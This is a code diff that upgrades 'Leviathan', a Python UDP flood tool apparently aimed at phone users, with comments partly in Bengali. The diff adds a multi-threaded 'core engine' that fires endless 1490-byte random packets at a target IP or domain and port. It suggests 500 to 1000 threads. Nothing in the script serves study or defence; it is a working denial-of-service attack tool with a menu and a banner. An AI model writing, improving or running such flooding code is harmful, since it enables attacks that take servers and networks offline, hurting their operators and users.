@@ -3,6 +3,7 @@ import sys
 import time
 import socket
 import random
+import threading
 from platform import system
 
 # --- ULTRA HIGHLIGHTED COLORS ---
@@ -14,7 +15,6 @@ B = '\033[1;34m'  # Blue Bold
 C = '\033[1;36m'  # Cyan Bold
 M = '\033[1;35m'  # Magenta Bold
 RE = '\033[0m'    # Reset
-# Background Highlights
 HG = '\033[1;42;30m' # Highlight Green
 HR = '\033[1;41;37m' # Highlight Red
 HB = '\033[1;44;37m' # Highlight Blue
@@ -33,101 +33,97 @@ def logo():
    ███████╗███████╗ ╚████╔╝ ██║██║  ██║   ██║   ██║  ██║██║  ██║██║ ╚████║
    ╚══════╝╚══════╝  ╚═══╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
 {W}   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-           {HG}  SYSTEM VERSION: 3.0  {RE}   {HB}  TEAM: LEVIATHAN  {RE}
+           {HG}  SYSTEM VERSION: 4.0  {RE}   {HB}  POWER: MULTI-THREADED  {RE}
 {W}   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RE}
     """)
 
-def slow_print(text):
-    for char in text:
-        sys.stdout.write(char)
-        sys.stdout.flush()
-        time.sleep(0.01)
+# ---------------------------------------------------------
+# [!] WORKING PART (CORE ENGINE) - এই অংশটিই আসল কাজ করে
+# ---------------------------------------------------------
+
+sent = 0
+def attack():
+    global sent
+    # প্যাকেট ডাটা জেনারেট করা (1490 bytes standard MTU)
+    bytes_data = random._urandom(1490)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        try:
+            # লক্ষ্যবস্তুতে প্যাকেট পাঠানো
+            sock.sendto(bytes_data, (target_ip, target_port))
+            sent += 1
+            # লাইভ স্ট্যাটাস প্রিন্ট (হাইলাইটেড)
+            print(f"{G}LEVIATHAN_STRIKE {W}>> {R}{target_ip}{W} | {B}PORT:{Y}{target_port} {W}| {HG} SENT:{sent} {RE}", end="\r")
+        except:
+            pass
+
+# ---------------------------------------------------------
 
 def startup():
     clear()
-    print(f"\n\n{B}[>] {W}BOOTING LEVIATHAN CORE...")
+    print(f"\n\n{B}[>] {W}BOOTING LEVIATHAN CORE ENGINE...")
     time.sleep(1)
     for i in range(1, 101, 5):
         sys.stdout.write(f"\r{B}[{G}{'█' * (i // 2)}{W}{'.' * (50 - (i // 2))}{B}] {Y}{i}%")
         sys.stdout.flush()
-        time.sleep(0.05)
+        time.sleep(0.03)
     print(f"\n\n{HG}  SUCCESS: ALL MODULES LOADED  {RE}\n")
-    time.sleep(1.5)
-
-# Initialize Socket
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes_data = random._urandom(1490)
+    time.sleep(1)
 
 startup()
 
 while True:
     logo()
-    print(f" {HC}  MAIN INTERFACE  {RE} ")
-    print(f"\n {G}[01]{W} ATTACK DOMAIN")
-    print(f" {G}[02]{W} ATTACK TARGET IP")
-    print(f" {G}[03]{W} VIEW CREDITS")
+    print(f" {HC}  TARGET SELECTION  {RE} ")
+    print(f"\n {G}[01]{W} ATTACK DOMAIN (URL)")
+    print(f" {G}[02]{W} ATTACK DIRECT IP")
     print(f" {R}[00]{W} TERMINATE SYSTEM")
     
-    print(f"\n{C}╔═══[{G}Leviathan@Console{C}]")
-    choice = input(f"{C}╚══{B}> {Y}")
+    choice = input(f"\n{C}╔═══[{G}Leviathan@Console{C}]\n╚══{B}> {Y}")
 
     if choice == '1':
         domain = input(f"\n{B}[?]{W} TARGET URL: {Y}")
         try:
-            ip = socket.gethostbyname(domain)
+            target_ip = socket.gethostbyname(domain)
             break
         except:
             print(f"{HR} ERROR: INVALID DOMAIN {RE}")
             time.sleep(2)
     elif choice == '2':
-        ip = input(f"\n{B}[?]{W} TARGET IP: {Y}")
+        target_ip = input(f"\n{B}[?]{W} TARGET IP: {Y}")
         break
-    elif choice == '3':
-        print(f"\n{HB}  DEVELOPER INFO  {RE}")
-        print(f"{W}Created by  : {G}LEVIATHAN")
-        print(f"{W}Telegram    : {C}@leviathan_official")
-        print(f"{W}Status      : {Y}STABLE RELEASE")
-        input(f"\n{M}BACK TO MENU (ENTER)...")
-    elif choice == '0' or choice == '00':
-        print(f"{HR} SHUTTING DOWN... {RE}")
+    elif choice == '0':
         sys.exit()
-    else:
-        print(f"{HR} INVALID SELECTION {RE}")
-        time.sleep(1)
 
-# Attack Setup
+# পোর্টের কনফিগারেশন
 logo()
 print(f" {HC}  ATTACK CONFIGURATION  {RE} ")
-print(f"\n{W}TARGET IP  : {R}{ip}")
-port_choice = input(f"{W}SET CUSTOM PORT? (y/n): {Y}").lower()
+target_port = input(f"\n{W}TARGET PORT (Default 80): {Y}")
+target_port = int(target_port) if target_port else 80
 
-if port_choice == "y":
-    port = int(input(f"{B}[?]{W} ENTER PORT: {Y}"))
-    port_mode = True
-else:
-    port = 1
-    port_mode = False
+# থ্রেড কাউন্ট (পাওয়ার নির্ধারণ)
+print(f"\n{Y}[!] Higher threads = More power but may slow your phone.")
+thread_count = input(f"{W}THREADS (Recommend 500-1000): {Y}")
+thread_count = int(thread_count) if thread_count else 500
 
-# Warning Countdown
-print(f"\n{HR}  WARNING: ATTACK STARTING IN 3 SECONDS  {RE}")
+# অ্যাটাক শুরু
+print(f"\n{HR}  WARNING: LEVIATHAN IS LAUNCHING IN 3 SEC...  {RE}")
 time.sleep(3)
+clear()
+logo()
 
-sent = 0
+# WORKING PART: থ্রেডগুলো চালু করা
+for i in range(thread_count):
+    thread = threading.Thread(target=attack)
+    thread.daemon = True # যাতে টুল বন্ধ করলে থ্রেডও বন্ধ হয়
+    thread.start()
+
+# স্ক্রিন যাতে সাথে সাথে বন্ধ না হয়
 try:
     while True:
-        if not port_mode:
-            port = port + 1 if port < 65534 else 1
-        
-        sock.sendto(bytes_data, (ip, port))
-        sent += 1
-        
-        # Highlighted Attack Log
-        print(f"{G}LEVIATHAN_STRIKE {W}>> {R}{ip}{W} | {B}PORT:{Y}{port} {W}| {HG} SENT:{sent} {RE}")
-        
-        # Optional: very small sleep to prevent Termux crash on some devices
-        # time.sleep(0.001) 
-
+        time.sleep(1)
 except KeyboardInterrupt:
-    print(f"\n\n{HR}  ATTACK ABORTED BY USER  {RE}")
-    print(f"{HC} TOTAL DATA PACKETS SENT: {sent} {RE}")
-    time.sleep(3)
+    print(f"\n\n{HR}  SYSTEM HALTED BY OPERATOR  {RE}")
+    print(f"{HC} FINAL PACKET COUNT: {sent} {RE}")
+    sys.exit()
